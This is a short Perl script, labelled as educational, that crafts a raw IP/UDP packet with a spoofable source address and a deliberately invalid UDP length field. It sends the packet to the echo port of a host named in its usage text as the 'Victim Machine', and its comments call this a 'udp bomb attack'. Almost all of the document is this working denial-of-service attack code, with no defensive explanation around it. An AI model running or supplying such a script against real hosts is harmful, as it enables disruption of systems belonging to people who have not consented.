##########################################
###########Source for educational purpose############

#!/usr/bin/perl
use Socket;

$src_host = $ARGV[0];
$dst_host = $ARGV[1];
$src_port = 33333;
$dest_port = 7;
$len = 3; 
#$len is the udp packet length in the udp header. Must Not be less than 8, for udp bomb attack make it less than 8 ...say 3..lol ;)
$cksum = 0;
$data = "TEST";
$udp_len = 12; #8+TEST
$udp_proto = 17; #17 is the code for udp, alternatively, you can getprotobyname.
if(!defined $src_host or !defined $src_port or !defined $dst_host or !defined!dest_port)
{ 
 print "##### Script to send a UDP packet, src port is 33333 and Dest port is 7 (echo)."
 print  "To change these, make changes in the script. #####\n";
 print "\nUsage: perl $0 \n";
 print "Eg. perl $0 9.12.34.237 9.12.34.239\n";

 print "9.12.34.237 => Attack Machine\n";
 print "9.12.34.239 => Victim Machine\n";
 exit;
}


#Prepare the udp packet, not required, we arent calculating the checksum ;)
#$udp_packet = pack("nnnna*", $src_port,$dest_port,$len, $cksum, $data);
$zero_cksum = 0; my $dst_host = (gethostbyname($dst_host))[4]; my $src_host = (gethostbyname($src_host))[4];
# Now lets construct the IP packet
my $ip_ver = 4;
my $ip_len = 5; 
my $ip_ver_len = $ip_ver . $ip_len; 
my $ip_tos = 00; 
my ($ip_tot_len) = $udp_len + 20; 
my $ip_frag_id = 19245; 
my $ip_frag_flag = "010"; 
my $ip_frag_oset = "0000000000000"; 
my $ip_fl_fr = $ip_frag_flag . $ip_frag_oset; 
my $ip_ttl = 30;

#H2H2nnB16C2na4a4 for the IP Header part#nnnna* for the UDP Header part.
#To undertsand these, see the manual of pack function and IP and UDP Header formats
#IP checksum ($zero_cksum is calculated by the kernel. Dont worry about it.)

my ($pkt) = pack('H2H2nnB16C2na4a4nnnna*',
$ip_ver_len,$ip_tos,$ip_tot_len,$ip_frag_id,
$ip_fl_fr,$ip_ttl,$udp_proto,$zero_cksum,$src_host,
$dst_host,$src_port,$dest_port,$len, $cksum, $data);


socket(RAW, AF_INET, SOCK_RAW, 255) || die $!; setsockopt(RAW, 0, 1, 1); 
my ($destination) = pack('Sna4x8', AF_INET, $dest_port, $dst_host); 
send(RAW,$pkt,0,$destination);

###########Ends here#####################
######################################
